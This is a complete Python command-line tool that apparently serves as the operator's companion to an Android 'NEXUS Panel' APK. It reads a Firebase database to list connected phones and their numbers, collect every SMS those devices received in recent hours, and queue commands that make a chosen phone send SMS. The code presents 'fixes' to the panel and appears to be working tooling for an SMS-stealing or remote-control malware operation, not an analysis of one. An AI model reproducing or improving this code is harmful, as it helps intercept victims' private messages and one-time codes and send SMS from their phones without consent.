"""
NEXUS Panel - Firebase SMS Companion
Language: Python 3.10+, Runtime: standalone
Target: Firebase Realtime Database (same backend as NEXUS Panel 1.0 APK)

Fixes:
  - getLatestSms was limitToLast=1 → now timestamp-window query (last N hours)
  - sendSmsCommand was blocking 2s timeout → async with configurable timeout
  - All devices SMS in one view
"""

import sys
import json
import time
import argparse
import threading
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime, timezone


# ──────────────────────────────────────────────────────────────────────────────
# Firebase REST helper
# ──────────────────────────────────────────────────────────────────────────────

class FirebaseREST:
    def __init__(self, url: str, auth_token: str = ""):
        self.base = url.rstrip("/")
        self.token = auth_token

    def _req(self, path: str, method: str = "GET", data: dict = None, timeout: int = 8) -> dict | None:
        params = {"timeout": "8s"}
        if self.token:
            params["auth"] = self.token
        qs = urllib.parse.urlencode(params)
        full_url = f"{self.base}{path}?{qs}"
        body = json.dumps(data).encode() if data else None
        req = urllib.request.Request(full_url, data=body, method=method)
        req.add_header("Content-Type", "application/json")
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                raw = resp.read().decode()
                return json.loads(raw) if raw and raw != "null" else None
        except urllib.error.HTTPError as e:
            print(f"  [HTTP {e.code}] {path}: {e.reason}", file=sys.stderr)
            return None
        except urllib.error.URLError as e:
            print(f"  [NET] {path}: {e.reason}", file=sys.stderr)
            return None
        except Exception as e:
            print(f"  [ERR] {path}: {e}", file=sys.stderr)
            return None

    def get(self, path: str, order_by: str = None, start_at: int = None,
            limit_last: int = None, timeout: int = 8) -> dict | None:
        params: dict = {"timeout": "8s"}
        if self.token:
            params["auth"] = self.token
        if order_by:
            params["orderBy"] = f'"{order_by}"'
        if start_at is not None:
            params["startAt"] = start_at
        if limit_last:
            params["limitToLast"] = limit_last
        qs = urllib.parse.urlencode(params)
        full_url = f"{self.base}{path}?{qs}"
        req = urllib.request.Request(full_url, method="GET")
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                raw = resp.read().decode()
                return json.loads(raw) if raw and raw != "null" else None
        except Exception as e:
            print(f"  [GET ERR] {path}: {e}", file=sys.stderr)
            return None

    def put(self, path: str, data: dict, timeout: int = 5) -> dict | None:
        return self._req(path, "PUT", data, timeout)

    def patch(self, path: str, data: dict, timeout: int = 5) -> dict | None:
        return self._req(path, "PATCH", data, timeout)

    def post(self, path: str, data: dict, timeout: int = 5) -> dict | None:
        return self._req(path, "POST", data, timeout)


# ──────────────────────────────────────────────────────────────────────────────
# Device + SMS fetcher
# ──────────────────────────────────────────────────────────────────────────────

def fetch_devices(fb: FirebaseREST) -> list[dict]:
    data = fb.get("/devices.json")
    if not data:
        return []
    devices = []
    for dev_id, info in data.items():
        if isinstance(info, dict):
            info["_id"] = dev_id
            devices.append(info)
    return devices


def fetch_all_sms_last_n_hours(fb: FirebaseREST, hours: float = 1.0) -> list[dict]:
    """
    Replaces getLatestSms (limitToLast=1) with timestamp-window query.
    Pulls from /allSms/{deviceId}/ for ALL devices, filtered to last `hours` hours.
    Returns flat list sorted newest-first.
    """
    now_ms = int(time.time() * 1000)
    start_ms = int(now_ms - hours * 3600 * 1000)

    # Get device list first
    devices = fetch_devices(fb)
    device_ids = [d["_id"] for d in devices]

    if not device_ids:
        # Fallback: read /allSms/ flat and filter
        data = fb.get("/allSms.json", order_by="timestamp", start_at=start_ms)
        if not data:
            return []
        return _flatten_sms(data, start_ms)

    all_sms: list[dict] = []
    # Fetch per-device with timestamp filter — parallel threads
    lock = threading.Lock()

    def fetch_device_sms(dev_id: str):
        path = f"/allSms/{dev_id}.json"
        data = fb.get(path, order_by="timestamp", start_at=start_ms)
        if not data:
            return
        msgs = _flatten_sms(data, start_ms, device_id=dev_id)
        with lock:
            all_sms.extend(msgs)

    threads = [threading.Thread(target=fetch_device_sms, args=(did,), daemon=True)
               for did in device_ids]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=10)

    # Also check /deviceMessages/ path (panel uses this too)
    for dev_id in device_ids:
        path = f"/deviceMessages/{dev_id}.json"
        data = fb.get(path, order_by="timestamp", start_at=start_ms)
        if data:
            msgs = _flatten_sms(data, start_ms, device_id=dev_id)
            # dedupe by timestamp+sender
            existing = {(m.get("timestamp"), m.get("sender")) for m in all_sms}
            for m in msgs:
                key = (m.get("timestamp"), m.get("sender"))
                if key not in existing:
                    all_sms.append(m)
                    existing.add(key)

    all_sms.sort(key=lambda x: x.get("timestamp", 0), reverse=True)
    return all_sms


def _flatten_sms(data: dict | list, start_ms: int, device_id: str = "") -> list[dict]:
    result = []
    items = data.values() if isinstance(data, dict) else data
    for item in items:
        if not isinstance(item, dict):
            continue
        ts = item.get("timestamp", 0)
        if ts < start_ms:
            continue
        if device_id:
            item = dict(item)
            item.setdefault("_deviceId", device_id)
        result.append(item)
    return result


# ──────────────────────────────────────────────────────────────────────────────
# SMS Send — async, non-blocking
# ──────────────────────────────────────────────────────────────────────────────

def send_sms_command(fb: FirebaseREST, device_id: str, to: str, body: str,
                     sim_slot: int = 0, callback=None):
    """
    Async SMS send — writes to /commands/{deviceId}/sendSms
    Non-blocking: runs in background thread, calls callback(success, msg) on completion.
    Fixes the 2s blocking timeout issue from the APK.
    """
    cmd = {
        "type": "sendSms",
        "to": to,
        "body": body,
        "simSlot": sim_slot,
        "timestamp": int(time.time() * 1000),
    }

    def _send():
        # Primary path: /commands/{deviceId}/sendSms
        result = fb.put(f"/commands/{device_id}/sendSms.json", cmd, timeout=10)
        if result is not None:
            if callback:
                callback(True, f"SMS command sent to device {device_id}")
            return
        # Fallback path: /sendSms.json (legacy APK path)
        result = fb.post("/sendSms.json", {"deviceId": device_id, **cmd}, timeout=10)
        if result is not None:
            if callback:
                callback(True, f"SMS command sent (fallback) to {device_id}")
            return
        if callback:
            callback(False, "Firebase write failed — device may be offline")

    t = threading.Thread(target=_send, daemon=True)
    t.start()
    return t


# ──────────────────────────────────────────────────────────────────────────────
# Display helpers
# ──────────────────────────────────────────────────────────────────────────────

def fmt_ts(ms: int) -> str:
    if not ms:
        return "—"
    dt = datetime.fromtimestamp(ms / 1000, tz=timezone.utc).astimezone()
    return dt.strftime("%Y-%m-%d %H:%M:%S")


def print_sms_table(sms_list: list[dict]):
    if not sms_list:
        print("  (no SMS in time window)")
        return
    col = {"device": 14, "sender": 18, "body": 48, "time": 19}
    header = (f"{'DEVICE':<{col['device']}}  "
              f"{'SENDER':<{col['sender']}}  "
              f"{'BODY':<{col['body']}}  "
              f"{'TIME':<{col['time']}}")
    sep = "-" * len(header)
    print(sep)
    print(header)
    print(sep)
    for sms in sms_list:
        dev   = str(sms.get("_deviceId", sms.get("deviceId", "?")))[:col["device"]]
        sender = str(sms.get("sender", sms.get("from", "?")))[:col["sender"]]
        body   = str(sms.get("body", sms.get("text", sms.get("message", ""))))
        body   = body.replace("\n", " ")[:col["body"]]
        ts     = fmt_ts(sms.get("timestamp", 0))
        print(f"{dev:<{col['device']}}  {sender:<{col['sender']}}  "
              f"{body:<{col['body']}}  {ts:<{col['time']}}")
    print(sep)
    print(f"  Total: {len(sms_list)} SMS")


# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="NEXUS Panel — Firebase SMS Companion",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Commands:
  list-sms   [--hours N]          Fetch all SMS from all devices for last N hours (default 1)
  list-devices                    Show all connected devices
  send-sms   --device ID --to NUM --body TEXT [--sim 0|1]   Send SMS via device

Examples:
  python3 firebase_sms.py --url https://YOUR-DB.firebaseio.com list-sms --hours 1
  python3 firebase_sms.py --url https://YOUR-DB.firebaseio.com --token TOKEN list-sms
  python3 firebase_sms.py --url https://YOUR-DB.firebaseio.com send-sms --device abc123 --to +919876543210 --body "Hello"
        """
    )
    parser.add_argument("--url", required=True,
                        help="Firebase Realtime DB URL (e.g. https://xxx-default-rtdb.firebaseio.com)")
    parser.add_argument("--token", default="",
                        help="Firebase auth token (if DB rules require auth)")
    sub = parser.add_subparsers(dest="cmd")

    p_sms = sub.add_parser("list-sms", help="Fetch all SMS for last N hours")
    p_sms.add_argument("--hours", type=float, default=1.0,
                       help="Time window in hours (default 1)")

    sub.add_parser("list-devices", help="List connected devices")

    p_send = sub.add_parser("send-sms", help="Send SMS via a device")
    p_send.add_argument("--device", required=True, help="Device ID")
    p_send.add_argument("--to", required=True, help="Destination phone number")
    p_send.add_argument("--body", required=True, help="SMS text")
    p_send.add_argument("--sim", type=int, default=0, choices=[0, 1],
                        help="SIM slot (0 or 1, default 0)")

    args = parser.parse_args()
    if not args.cmd:
        parser.print_help()
        return

    fb = FirebaseREST(args.url, args.token)

    if args.cmd == "list-devices":
        print("\n[Devices]")
        devices = fetch_devices(fb)
        if not devices:
            print("  No devices found.")
            return
        for d in devices:
            did   = d.get("_id", "?")
            name  = d.get("model", d.get("name", d.get("device", "unknown")))
            phone = d.get("phone", d.get("phoneNumber", "?"))
            last  = fmt_ts(d.get("lastSeen", d.get("timestamp", 0)))
            print(f"  {did}  |  {name}  |  {phone}  |  last seen: {last}")
        print(f"\n  Total: {len(devices)} device(s)")

    elif args.cmd == "list-sms":
        print(f"\n[SMS — last {args.hours}h from all devices]")
        sms = fetch_all_sms_last_n_hours(fb, args.hours)
        print_sms_table(sms)

    elif args.cmd == "send-sms":
        print(f"\n[Send SMS] device={args.device}  to={args.to}")
        result = {"done": False, "msg": ""}

        def cb(ok, msg):
            result["done"] = True
            result["ok"]   = ok
            result["msg"]  = msg

        t = send_sms_command(fb, args.device, args.to, args.body, args.sim, callback=cb)
        t.join(timeout=15)
        if result.get("ok"):
            print(f"  OK: {result['msg']}")
        else:
            print(f"  FAIL: {result.get('msg', 'timeout')}", file=sys.stderr)
            sys.exit(1)


if __name__ == "__main__":
    main()
